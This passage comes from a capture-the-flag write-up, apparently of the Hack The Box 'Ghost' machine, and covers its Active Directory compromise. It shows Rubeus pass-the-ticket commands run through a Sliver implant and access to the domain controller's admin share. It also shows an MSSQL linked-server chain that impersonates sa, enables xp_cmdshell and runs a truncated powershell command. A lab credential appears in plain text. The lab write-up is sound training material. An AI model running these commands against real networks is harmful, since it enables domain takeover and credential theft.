DU1NjE4WqcRGA8yMDI0MDcyNDE5NTYxOFqoEBsOQ09SUC5HSE9TVC5IVEKpIzAhoAMCAQKhGjAYGwZrcmJ0Z3QbDkNPUlAuR0hPU1QuSFRC
 
[*] Decrypting TGT
 
# Purge the old tickets
rubeus -t 120 -- purge
[*] rubeus output:
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/
  v2.3.2
[*] Action: Purge Tickets
[+] Tickets successfully purged!
 
# Apply it to the current session
rubeus -t 120 -i -- ptt /ticket:<base64>
[*] rubeus output:
 
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/
 
  v2.3.2 
 
 
[*] Action: Import Ticket
[+] Ticket successfully imported!
 
sliver (DISTURBING_REALITY) > cd \\\\dc01.ghost.htb\\C\$
 
[*] \\dc01.ghost.htb\C$
 
cd users\\administrator\\desktop
 
[*] \\dc01.ghost.htb\C$\users\Administrator\desktop
 
cat root.txt
 
935989362f31051cxxxxxxxxxxxxxxxx

```

With the forged ticket I can also use `dcsync` to retrieve the hashes of the users within the `GHOST.HTB` domain and completely take over the `DC01`.

### Unintended Path <a href="#unintended-path" id="unintended-path"></a>

There was an unintended path that was basically a shortcut jumping over a few steps of the privilege escalation. The user `florence.ramirez` has guest access to `MSSQL` and from there I can use the same approach as through the Web Portal in order to get code execution on `PRIMARY`. Accessing the database directly with **mssqlclient** from [impacket](https://github.com/fortra/impacket) makes it way easier to enumerate and abuse the privileges.

```python
impacket-mssqlclient -windows-auth florence.ramirez:'uxLmt*udNc6t3HrF'@ghost.htb
Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
 
SQL (GHOST\florence.ramirez  guest@master)> enum_links
SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
--------   ----------------   -----------   --------------   ------------------   ------------   -------
DC01       SQLNCLI            SQL Server    DC01             NULL                 NULL           NULL
 
PRIMARY    SQLNCLI            SQL Server    PRIMARY          NULL                 NULL           NULL
 
Linked Server   Local Login   Is Self Mapping   Remote Login
-------------   -----------   ---------------   ------------
 
SQL (GHOST\florence.ramirez  guest@master)> use_link "PRIMARY"
 
SQL >"PRIMARY" (bridge_corp  bridge_corp@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee       grantor
----------   --------   ---------------   ----------   -----------   -------
b'LOGIN'     b''        IMPERSONATE       GRANT        bridge_corp   sa
 
SQL >"PRIMARY" (bridge_corp  bridge_corp@master)> exec_as_login sa
 
SQL >"PRIMARY" (sa  dbo@master)> enable_xp_cmdshell
[*] INFO(PRIMARY): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(PRIMARY): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
 
SQL >"PRIMARY" (sa  dbo@master)> xp_cmdshell "powershell -c ..."
```

Basically the steps are the same and in the end I receive a shell as `NT Service\MSSQLSERVER` and proceed with the escalation to NT Authority and take over the domain(s).

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
